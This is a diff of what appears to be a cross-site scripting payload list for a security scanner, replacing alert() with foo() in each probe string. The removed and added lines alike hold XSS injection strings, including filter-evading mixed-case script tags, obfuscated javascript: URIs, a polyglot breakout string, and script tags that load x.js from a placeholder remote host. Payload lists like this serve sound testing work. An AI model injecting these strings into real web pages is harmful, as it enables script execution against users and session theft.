@@ -1,15 +1,15 @@
 <SCrIPT>alert("RANDOMIZE")</SCrIPT>
 <ScRIPT>a=/RANDOMIZE/
-alert(a.source)</SCRiPT>
-<ScRIpT>alert(String.fromCharCode(RANDOMIZE))</SCriPT>
+foo(a.source)</SCRiPT>
+<ScRIpT>foo(String.fromCharCode(RANDOMIZE))</SCriPT>
 <ScRIPt SrC=http://RANDOMIZE/x.js></ScRIPt>
 <ScRIPt/XSS SrC=http://RANDOMIZE/x.js></ScRIPt>
 <ScRIPt/SrC=http://RANDOMIZE/x.js></ScRIPt>
-<SCrIPT>alert("RANDOMIZE")</SCrIPT>
-<SCRIPt>alert("RANDOMIZE")</ScRIPt>
-<IFRAME SRC="javascript:alert('RANDOMIZE');"></IFRAME>
-jAvasCript:alert("RANDOMIZE");
-javas   cript:alert("RANDOMIZE");
-javas&#x09;cript:alert("RANDOMIZE");
-javascript:alert("RANDOMIZE");
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCrIPT>foo("RANDOMIZE")</SCrIPT>
+<SCRIPt>foo("RANDOMIZE")</ScRIPt>
+<IFRAME SRC="javascript:foo('RANDOMIZE');"></IFRAME>
+jAvasCript:foo("RANDOMIZE");
+javas   cript:foo("RANDOMIZE");
+javas&#x09;cript:foo("RANDOMIZE");
+javascript:foo("RANDOMIZE");
+';foo(String.fromCharCode(88,83,83))//';foo(String.fromCharCode(88,83,83))//;foo(String.fromCharCode(88,83,83))//;foo(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>foo(String.fromCharCode(88,83,83))</SCRIPT>
